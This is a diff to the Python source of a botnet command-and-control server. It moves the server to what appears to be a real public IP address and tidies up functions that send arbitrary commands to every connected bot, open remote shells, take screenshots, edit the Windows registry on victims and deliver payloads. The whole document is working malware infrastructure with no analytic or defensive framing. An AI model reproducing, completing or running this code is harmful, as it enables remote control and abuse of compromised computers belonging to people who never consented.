@@ -3,6 +3,7 @@ from threading import Thread
 from time import sleep
 import sys
 import os
+import struct
 
 if len(sys.argv) > 1:
     payload_name = str(sys.argv[1])
@@ -19,7 +20,7 @@ test_bool = False
 #            return True
 #    return False
 
-def start_payload_delivery_server(port=2004,ip="157.230.12.188"):
+def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
     global payload_name
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ss.bind((ip,port))
@@ -47,8 +48,7 @@ def start_payload_delivery_server(port=2004,ip="157.230.12.188"):
         except Exception as ee:
             print("[*] An Unknown Error Occurred : %s"%(str(ee)))
 
-
-def start_server(port=2003,ip="127.0.0.1"):
+def start_server(port=2003,ip="142.93.158.189"):
     global botnet,exec_command,on_connect_exit
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
@@ -119,12 +119,14 @@ def shell_exec(cmd):
             print("[*] Shell execution failed on %s"%(bot))
 
 def update_botnet():
+    print("[*] Updating botnet every 15 seconds...")
     while True:
         try:
             sleep(15)
             global botnet,test_bool
             for bot in botnet:
                 test_conn(botnet[bot],bot)
+                global test_bool
                 if(test_bool == False):
                     print("[*] %s : Connection dead"%(bot))
                     del botnet[bot]
@@ -132,6 +134,8 @@ def update_botnet():
                     pass
         except socket.error:
             print("[*] %s : Connection dead"%(bot))
+        except:
+            pass
 
 def check_container(bot):
     if(os.path.exists(bot) != True):
@@ -163,8 +167,12 @@ def get_screenshot(addr):
 def exec_command(cmd):
     try:
         global botnet
+        cmd = cmd + '\r'
         print("[*] Sending Command Packets...")
         sleep(1)
+        print("Sending : %s"%(cmd))
+        #packet_size = len(cmd.encode())
+        #cmd_packet = struct.pack("<H%ds"%(int(packet_size)),packet_size,cmd.encode())
         for bot in botnet:
             botnet[bot].send(cmd.encode())
             resp = botnet[bot].recv(1024).decode()
@@ -182,13 +190,13 @@ def exec_command(cmd):
 def edit_registry():
     global botnet
     for bot in botnet:
-        print("[*] Editing windows registry on %s"(bot))
+        print("[*] Editing windows registry on %s"%(bot))
         botnet[bot].send("REGISTRY".encode())
         sleep(1)
         resp = botnet[bot].recv(1024).decode()
         if(resp == "OK"):
             sleep(1)
-            print("[*] Registry values added on %s"%(bot))
+            print("[*] Registry values added on %s"%(str(bot)))
             pass
         elif(resp == "FAILED"):
             print("[*] Failed to edit registry on %s"%(bot))
@@ -234,8 +242,8 @@ def process_shell(cmd):
         resp = botnet[bot].recv(1024).decode()
         if(resp == "DONE"):
             print("[*] Shell Execution completed on %s"%(bot))
-            output = botnet[bot].recv(10240).decode()
-            print("%s output : %s"%(bot,output))
+            output = botnet[bot].recv(1024).decode()
+            print("%s output : \n\n%s\n\n"%(bot,output))
         elif(resp == "FAILED"):
             print("[*] Shell execution failed on %s"%(bot))
 
@@ -263,7 +271,7 @@ def process_cmd(cmd):
                 addr = cmd.strip("screenshot ")
                 get_screenshot(addr)
 
-            if 'execute' in cmd:
+            if "execute" in cmd:
                 #cmd = cmd.strip("execute ")
                 exec_command(cmd)
                 print("[*] Command packets sent!")
@@ -271,8 +279,8 @@ def process_cmd(cmd):
             if(cmd == "get os"):
                 detect_os()
 
-            if "get shell" in cmd:
-                process_shell(cmd.strip("get shell "))
+            if "get SHELL" in cmd:
+                process_shell(cmd.strip("get SHELL "))
 
             if "shell" in cmd:
                 shell_exec(cmd)
@@ -286,12 +294,14 @@ def process_cmd(cmd):
                 t1 = Thread(target=test_bots,args=())
                 t1.start()
                 pass
+            # if(cmd == ""):
+            #     pass
             else:
-                print("[*] Invalid command")
+                pass
         except socket.error:
             print("[*] Socket error")
-        except:
-            print("[*] Error occurred while processing command")
+        except Exception as ee:
+            print("[*] Error occurred while processing command : %s"%(str(ee)))
             pass
 
 def main():
@@ -303,7 +313,7 @@ def main():
             payload_delivery_thread.start()
         sleep(2)
         while True:
-            cmd = raw_input("\n>>")
+            cmd = input("\n>>")
             command_thread = Thread(target=process_cmd,args=(cmd,))
             command_thread.start()
     except KeyboardInterrupt:
